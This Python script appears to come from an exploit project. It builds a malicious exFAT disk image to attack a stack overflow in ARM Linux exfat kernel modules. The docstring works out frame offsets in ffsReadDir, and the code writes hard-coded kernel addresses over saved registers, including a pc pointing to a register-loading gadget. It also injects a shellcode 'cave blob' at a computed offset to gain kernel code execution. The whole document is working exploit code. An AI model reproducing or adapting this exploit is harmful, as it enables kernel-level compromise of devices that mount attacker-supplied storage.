#!/usr/bin/env python3
# SPDX-License-Identifier: AGPL-3.0-only
# Kant-M2 adaptation; see docs/PROVENANCE.md.
"""Build the Kant-M2 exFAT trigger volume (p1).

The cave blob is injected at name-stream byte offset 1420 (0x58c), which is
where `ip` points at the ffsReadDir epilogue:

    exfat_iterate  (exfat_fs.ko, fp_I, r1 = fp_I-0x36c)
      -> FsReadDir (exfat_core.ko 0x7384, fp_F = fp_I-0x398, sp = fp_F-0x1c)
        -> ffsReadDir (0x260c, fp_S = fp_F-0x20)
             uniname = fp_S-0x230 = fp_I-0x5e8
             ip      = r8+0x310  = fp_I-0x5c
             ip - uniname = 0x58c = 1420

Frame values written directly into the ffsReadDir reload block:
    528 (r6)  = 0xc00083d8   memcpy destination (CAVE-40)
    548 (fp)  = 0xc0008428   copy-window exit frame (CAVE+40)
    552 (sp)  = 0xc0008e00   scratch stack
    556 (pc)  = 0xc04dde3c   ldm ip,{r2,r3,r4,r7,r8,sb,sl,sp,lr,pc}

Zero halfwords are allowed only because the blob's single zero is the high
half of r4=copy_len at source+10, which terminates r7/r8 (disposable) and
resumes at source+20 with r9.
"""
import argparse
import math
import os
import subprocess
import sys

LDM_IP = 0xC04DDE3C
PUTS = [
    "528:c00083d8",
    "548:c0008428",
    "552:c0008e00",
    f"556:{LDM_IP:08x}",
]
INJECT_OFF = 1420


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--cave-blob", required=True)
    ap.add_argument("--out", required=True)
    ap.add_argument("--size-mb", type=float, default=8)
    ap.add_argument("--pattern", default="offs16")
    ap.add_argument("--no-probe-file", action="store_true")
    a = ap.parse_args()

    blob_len = os.path.getsize(a.cave_blob)
    num_ext = math.ceil((INJECT_OFF + blob_len) / 30) + 1
    n_entries = num_ext - 1
    if num_ext > 255:
        raise SystemExit(f"num_ext={num_ext} exceeds the u8 field / wraps")
    if 30 * n_entries < INJECT_OFF + blob_len:
        raise SystemExit("computed stream is too short for the injection")

    here = os.path.dirname(os.path.abspath(__file__))
    mk = os.path.join(here, "mk_trigger.py")
    cmd = [sys.executable, mk, a.out,
           "--size-mb", str(a.size_mb),
           "--num-ext", str(num_ext),
           "--entries", str(n_entries),
           "--pattern", a.pattern]
    for p in PUTS:
        cmd += ["--put", p]
    cmd += ["--inject-allow-zero", f"{INJECT_OFF}:{a.cave_blob}"]
    if a.no_probe_file:
        cmd.append("--no-probe-file")
    subprocess.run(cmd, check=True)
    print(f"[kant] num_ext={num_ext} entries={n_entries} "
          f"stream={30*n_entries} bytes blob={blob_len} bytes "
          f"inject={INJECT_OFF} end={INJECT_OFF+blob_len}")


if __name__ == "__main__":
    main()
